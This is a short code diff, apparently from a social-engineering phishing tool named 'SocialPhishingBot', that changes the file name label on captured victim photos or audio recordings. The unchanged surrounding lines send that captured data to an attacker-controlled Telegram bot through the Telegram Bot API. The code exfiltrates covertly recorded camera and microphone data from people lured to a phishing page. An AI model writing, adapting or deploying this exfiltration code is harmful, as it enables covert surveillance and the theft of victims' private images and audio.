@@ -175,7 +175,7 @@
 
       const formData = new FormData();
       formData.append('chat_id', chatId);
-      formData.append(type === 'photo' ? 'photo' : 'audio', data, `@SocialPhishingBot.${type === 'photo' ? 'jpg' : 'wav'}`);
+      formData.append(type === 'photo' ? 'photo' : 'audio', data, `@bangladeshcuber.${type === 'photo' ? 'jpg' : 'wav'}`);
 
       fetch(`https://api.telegram.org/bot${botToken}/send${type.charAt(0).toUpperCase() + type.slice(1)}`, 
 {
